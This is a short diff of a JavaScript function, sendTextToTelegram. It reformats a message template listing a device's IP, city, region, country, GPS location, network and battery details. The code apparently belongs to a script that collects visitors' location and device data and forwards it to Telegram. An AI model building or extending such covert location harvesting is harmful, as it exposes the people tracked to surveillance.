@@ -377,11 +377,11 @@ async function sendTextToTelegram(data) {
 - Data Saver: ${data.network.saveData}
 
 📍 *Location & IP*
-- IP: ||${ip}||
-- City: ${city}
-- Region: ${region}
-- Country: ${country}
-- GPS: ${gps}
+- IP: ${data.ip}
+- City: ${data.city}
+- Region: ${data.region}
+- Country: ${data.country}
+- GPS: ${data.location}
 
 🔋 *Battery*
 - Level: ${data.battery}
